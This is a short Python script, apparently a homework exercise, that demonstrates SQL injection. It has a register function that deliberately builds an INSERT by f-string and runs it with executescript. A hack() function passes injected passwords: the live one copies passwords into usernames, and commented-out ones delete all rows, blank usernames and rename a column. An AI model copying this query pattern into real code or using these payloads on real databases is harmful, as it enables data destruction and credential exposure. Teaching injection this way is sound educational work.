import sqlite3


def register(username: str, password: str) -> None:
    with sqlite3.connect('../homework.db') as conn:
        cursor = conn.cursor()
        cursor.executescript(
            f"""
            INSERT INTO `table_users` (username, password)
            VALUES ('{username}', '{password}')  
            """
        )
        conn.commit()


def hack() -> None:
    username: str = "I like"
    # password: str = "SQL Injection'); DELETE FROM `table_users`; --"
    # password: str = "SQL Injection'); UPDATE `table_users` SET `username` = ''; --"
    password: str = "SQL Injection'); INSERT INTO `table_users` (`username`, `password`) SELECT `password`, `username` FROM `table_users`; --"
    # password: str = "SQL Injection'); ALTER TABLE `table_users` RENAME COLUMN `username` TO `not_username`; --"
    register(username, password)


if __name__ == '__main__':
    register('wignorbo', 'sjkadnkjasdnui31jkdwq')
    hack()
